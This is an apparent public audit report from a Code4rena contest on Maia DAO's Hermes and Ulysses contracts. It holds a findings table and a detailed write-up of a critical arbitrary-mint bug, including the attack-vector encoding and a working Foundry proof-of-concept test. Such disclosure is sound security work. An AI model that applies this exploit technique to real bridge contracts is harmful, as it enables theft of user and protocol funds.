# About the Audit
This security review was conducted as an involvement in a public and open-source competition hosted by code4arena & Maia Dao. 
The team's efforts in securing the project managed to earn a top 3 finish, receiving praise from the developers, judging staff & other participants

The auditing team is known as Voyvoda and includes 3 Blockchain Security Experts
* alexxander $~~~~~~$ | twitter: https://twitter.com/__alexxander_
* deadrosesxyz $~$ | twitter: https://twitter.com/deadrosesxyz
* gogotheauditor | twitter: https://twitter.com/gogotheauditor
  
# About Maia Dao
Maia Dao is a DeFi Ecosystem consisting of 4 main projects - Maia, Hermes, Talo & Ulyses.
 
The audit primaraly focused on veryfiying and securing - 
* Hermes - a governance & rewards distribution system.
* Ulyses - an omnichain & virtual liquidity system.

# Findings List
| # | Issue Title                                                             | Severity | Status       |
| ------ | ----------------------------------------------------------------- | -------- | ------------ |
| [[1]](#my-section1) | Attacker can mint arbitrary amount of `hToken` on RootChain                                                                   | Critical | Fixed |
| [[2]](#my-section2) | Re-adding a deprecated gauge in a new epoch before calling `updatePeriod()` / `queueRewardsForCycle()` will leave some gauges without rewards.  | Critical | Fixed |
| [[3]](#my-section3) | Attacker can steal Accumulated Awards from RootBridgeAgent by abusing `retrySettlement()`                                     | High     | Fixed |
| [[4]](#my-section4) | `sweep()` doesn’t convert WETH to ETH                                                                                         | High     | Fixed |
| [[5]](#my-section5) | `retrySettlement()` should revert on a Settlement that has been redeemed or is non existing, crediting back ETH to user       | Medium   | Fixed |
| [[6]](#my-section6) | UniV3 Staker `restakeToken(...)` calls unstakeToken(...)` with wrong argument                                                 | Medium   | Fixed |
| [[7]](#my-section7) | BoostAggregator loss of funds for low-value rewards                                                                           | Medium   | Fixed |
| [[8]](#my-section8) | BoostAggregator owner can set fees to 100% and steal all of the users' rewards                                                | Medium   | Fixed |
| [[9]](#my-section9) | Deprecating a gauge before `queueRewardsForCycle()` in a new cycle leads to loss of rewards                                   | Medium   | Acknowledged |
| [[10]](#my-section10) | Adversary can grief wrongfully sent NFTs to BoostAggregator.sol                                                             | Low      | Fixed |
| [[11]](#my-section11) | Adversary can restrain users from withdrawing their NFTs from UniswapV3Staker                                               | Low      | Acknowledged |

# Detailed Explanation

## <a id="my-section1"></a> 1. Attacker can mint arbitrary amount of `hToken` on RootChain

### Severity
Critical

### Impact
Adversary can construct an attack vector that let’s him mint arbitrary amount of hToken’s on the Root Chain.

### Vulnerable code
[link1](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L275-L316) |
[link2](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174) |
[link3](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgentExecutor.sol#L259-L299) |
[link4](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L404-L426) |
[link5](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootPort.sol#L276-L284) |

### Description
The `callOutSignedAndBridgeMultiple(...)` function is supposed to bridge multiple tokens to a destination chain and also carry the msg.sender so that the tokens can be credited to msg.sender's VirtualAccount. An attacker can call the function with such `DepositMultipleInputParams _dParams` that take advantage of several weaknesses contained within the function.

* Weakness #1 is that the supplied array of tokens `address[] hTokens` in `_dParams` is not checked if it exceeds 256, this causes an obvious issue where if hTokens length is > 256 the recorded length in packedData will be wrong since it's using an unsafe cast to uint8 and will overflow - `uint8(_dParams.hTokens.length)`.

* Weakness #2 arises in the subsequent internal function `_depositAndCallMultiple(...)`, where the only check done on the supplied `hTokens`, `tokens`, `amounts` & `deposits` arrays is if the lengths match, however, there is no check if the length is the same as the one passed earlier to packedData.

* Weakness #3 is that `bridgeOutMultiple(...)`, called within`_createDepositMultiple(...)`, allows for supplying any address in the `hTokens` array since it only performs operations on these addresses if - `_deposits[i] > 0` or `_amounts[i] - _deposits[i] > 0` - in other words - if we set `deposits[i] = 0` & `amounts[i] = 0` we can supply ANY address in `hTokens[i]`.

### Constructing the exploit vector
An attacker can construct such DepositMultipleInput _dParams where `address[] hTokens` will have a length of 257 where all entries, except `hTokens[1]`, `hTokens[2]` & `hTokens[3]` , will contain the Branch address of the same `hToken` (note that in the examined functions above there is no restriction to supply the same `hToken` address multiple times).

In a similar way `address[] tokens` will have length of 257, however, here all entries will contain the underlying token (it is crucial to include the address of the underlying token to bypass `_normalizeDecimals()`).

Next `uint256[] amounts` will be of length 257 where all entries will contain 0. Similarly,

`uint256[] deposits` will be of length 257 where all entries will contain 0. In such configuration the attacker is able to supply a malicious `hToken` address as per weakness #3.

The crucial part now is that `hTokens[1]` will contain the address of the underlying token - this is needed to later bypass the params check on the RootChain.

`hTokens[2]` & `hTokens[3]` will contain the attacker’s malicious payload address that when converted to bytes and then uint256 will represent the arbitrary amount of tokens that the attacker will mint (this conversion will happen on the RootChain).

The attack vector is inline with the general encoding scheme displayed below, the important note is that Length will contain a value of 1 instead of 257 which will disrupt the decoding on the RootBranch. More details about the encoding can be found in `IRootBridgeAgent.sol`.
```solidity
+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+
|  Flag  |  Signer  | Length | depositNonce | hTokens[0], [1] ... [256] | tokens[0] ... [256] | amounts[0] ... [256] | deposits[0] ... [256] | toChain | data |   gas    |
+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+
| 1 byte | 20 bytes | 1 byte |   4 bytes    |       32 bytes * 257      |    32 bytes * 257   |    32 bytes * 257    |     32 bytes * 257    | 3 bytes | any  | 32 bytes |
+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+
```
### Supplying the exploit vector
The entry point for a message on the Root Chain is `anyExecute(bytes calldata data)` in `RootBridgeAgent.sol` - this will be called by Multichain’s AnycallExecutor. The function will unpack and navigate the supplied flag 0x06 - corresponding to `callOutSignedAndBridgeMultiple(...)` that was invoked on the Branch Chain.

Next `executeSignedWithDepositMultiple(...)` will be invoked residing in `RootBridgeAgentExecutor.sol`, which will subsequently call `_bridgeInMultiple(...)`, however, the amount of data passed to `_bridgeInMultiple(...)` depends on the packed length of the hTokens array.

Now `_bridgeInMultiple(...)` will unpack the `_dParams` where `numOfAssets = 1`, hence only 1 iteration, and will populate a set with in reality the first 4 entries of the supplied hTokens[] in the attack vector -

`hTokens[0] = hToken address`,

`tokens[0] = token address`,

`amounts[0] = malicious address payload cast to uint256`,

`deposits[0] = malicious address payload cast to uint256`.

Subsequently `bridgeInMultiple(...)` is called in `RootBridgeAgent.sol`, where `bridgeIn(...)` is called for every set of hToken, token, amount & deposit - one iteration in the attack scenario.

`bridgeIn(...)` now performs the critical `checkParams` from the CheckParamsLib library where if only 1 of 3 conditions is true we will have a revert.

The first check is revert if `_dParams.amount < _dParams.deposit` - this is false since amount & deposit are equal to the uint256 cast of the bytes packing of the malicious address payload.

The second check is:
```solidity
(_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain))
```
Here it’s true amount > 0 , however, `_dParams.hToken` is the first entry `hTokens[0]` of the attack vector’s `hTokens[]` array, therefore, it is a valid address & `isLocalToken(…)` will return true and will be negated by ! which will make the statement false because of &&, therefore, it is bypassed.

The third check is:
```solidity
(_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain))
```
here it’s true `deposit > 0` , however, `_dParams.token` is the second entry `hTokens[1]` of the attack vector’s `hTokens[]` array, therefore, it is a valid underlying address & `isUnderlyingToken(…)` will return true and will be negated by ! which will make the statement false because of &&, therefore, it is bypassed.

Now in the Root Port `bridgeToRoot(...)` will check if the globalAddress is valid and it is since we got it from the valid `hTokens[0]` entry in the constructed attack. Then `_amount - _deposit = 0` , therefore, no tokens will be transferred and finally the critical line if `(_deposit > 0) mint(_recipient, _hToken, _deposit, _fromChainId)` here `_deposit` is the malicious address payload that was packed to bytes and then unpacked and cast to uint256 & `_hToken` is the global address that we got from `hTokens[0]` back in the unpacking, therefore whatever the value of the uint256 representation of the malicious address is will be minted to the attacker.

### Coded POC
Coded PoC
Copy the two functions `testArbitraryMint` & `_prepareAttackVector` in `test/ulysses-omnichain/RootTest.t.sol` and place them in the `RootTest` contract after the setup.

Execute with `forge test --match-test testArbitraryMint -vv`

Result - 800000000 minted tokens for free in attacker’s Virtual Account

```solidity
function testArbitraryMint() public {
        
        // setup function used by developers to add local/global tokens in the system
        testAddLocalTokenArbitrum();

        // set attacker address & mint 1 ether to cover gas cost
        address attacker = address(0xAAAA);
        hevm.deal(attacker, 1 ether);
        
        // get avaxMockAssetHtoken global address that's on the Root
        address globalAddress = rootPort.getGlobalTokenFromLocal(avaxMockAssethToken, avaxChainId);
    
        // prepare attack vector
        bytes memory params = "";
        DepositMultipleInput memory dParams = _prepareAttackVector();
        uint128 remoteExecutionGas = 200_000_000_0;

        console2.log("------------------");
        console2.log("------------------");
        console2.log("ARBITRARY MINT LOG");

        console2.log("Attacker address", attacker);
        console2.log("Avax h token address",avaxMockAssethToken);
        console2.log("Avax underlying address", address(avaxMockAssetToken));

        console2.log("Attacker h token balance", ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));
        console2.log("Attacker underlying balance", avaxMockAssetToken.balanceOf(attacker));

        // execute attack
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridgeMultiple{value: 0.00005 ether}(params, dParams, remoteExecutionGas);
        
        // get attacker's virtual account address
        address vaccount = address(rootPort.getUserAccount(attacker));

        console2.log("Attacker h token balance avax", ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));        
        console2.log("Attacker underlying balance avax", avaxMockAssetToken.balanceOf(attacker));

        console2.log("Attacker h token balance root", ERC20hTokenRoot(globalAddress).balanceOf(vaccount));
    
        console2.log("ARBITRARY MINT LOG END");
		    console2.log("------------------");

    }

    function _prepareAttackVector() internal view returns(DepositMultipleInput memory) {
        
        // hToken address
        address addr1 = avaxMockAssethToken;

        // underlying address
        address addr2 = address(avaxMockAssetToken);

        // 0x2FAF0800 when encoded to bytes and then cast to uint256 = 800000000 
        address malicious_address = address(0x2FAF0800);
        
        uint256 amount1 = 0;
        uint256 amount2 = 0;

        uint num = 257;
        address[] memory htokens = new address[](num);
        address[] memory tokens = new address[](num);
        uint256[] memory amounts = new uint256[](num);
        uint256[] memory deposits = new uint256[](num);

        for(uint i=0; i<num; i++) {
            htokens[i] = addr1;
            tokens[i] = addr2;
            amounts[i] = amount1;
            deposits[i] = amount2;
        }
    
        // address of the underlying token
        htokens[1] = addr2;
      
        // copy of entry containing the arbitrary number of tokens
        htokens[2] = malicious_address;
        
        // entry containing the arbitrary number of tokens -> this one will be actually fed to mint on Root
        htokens[3] = malicious_address;
       
        uint24 toChain = rootChainId;

        // create input
        DepositMultipleInput memory input = DepositMultipleInput({
            hTokens:htokens,
            tokens:tokens,
            amounts:amounts,
            deposits:deposits,
            toChain:toChain
        });

        return input;

    }
```
### Recommendation
Enforce more strict checks around input param validation on bridging multiple tokens.

## 2. Re-adding a deprecated gauge in a new epoch before calling `updatePeriod()` / `queueRewardsForCycle()` will leave some gauges without rewards.
